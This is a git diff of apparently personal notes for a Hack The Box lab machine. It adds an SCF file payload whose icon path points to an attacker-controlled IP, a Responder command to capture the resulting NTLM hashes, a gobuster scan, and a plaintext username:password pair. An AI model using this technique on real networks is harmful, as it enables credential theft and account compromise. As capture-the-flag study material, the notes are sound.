@@ -24,13 +24,27 @@ GROUP:HTB\Domain Users
 ACL:Everyone:ALLOWED/OI|CI/FULL # <--- write permissions for unauthenticated users then it is possible to obtain passwords hashes of domain users or shells
 ```
 
-### //certsrv/ (Status: 401)
+### SMB Share – SCF File Attacks
+https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
+
+```text
+[Shell]
+Command=2
+IconFile=\\10.10.17.120\alvin.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+
+```bash
+sudo responder -I tun0 -v
+```
+
+Grab the hash and crack it to get credentials
+
+### /certsrv/ (Status: 401)
 ```bash
 gobuster -k -u https://10.10.10.103 -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt -t 20 -s 200,204,301,302,307,403,401
 ```
-
-### SMB Share – SCF File Attacks
-https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
 
 AMANDA:Ashare1972
 
